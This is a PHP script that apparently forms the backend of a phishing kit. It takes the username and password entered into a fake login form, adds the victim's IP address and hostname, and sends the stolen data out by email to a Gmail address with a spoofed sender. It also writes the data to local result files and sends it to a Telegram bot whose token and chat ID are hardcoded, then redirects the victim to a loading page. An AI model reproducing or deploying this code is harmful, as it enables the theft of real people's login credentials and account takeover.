<?php
$ip = getenv("REMOTE_ADDR");
$back = "loggin-error.html";
$hostname = gethostbyaddr($ip);
$message .= "------ LOG  ------\n";
$message .= "user : ".$_POST['username']."\n";
$message .= "password : ".$_POST['inputPassword']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "---------------\n";
$send = "fox.tox06@gmail.com";
$subject = "LOG 1| $ip ";
$headers = "From:Trnswise <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "1444398777:AAGLFUEgpwuJDL5EFSGP7NZuWfTtwNhEb0g";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1208803924&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: ../loading.php");

?>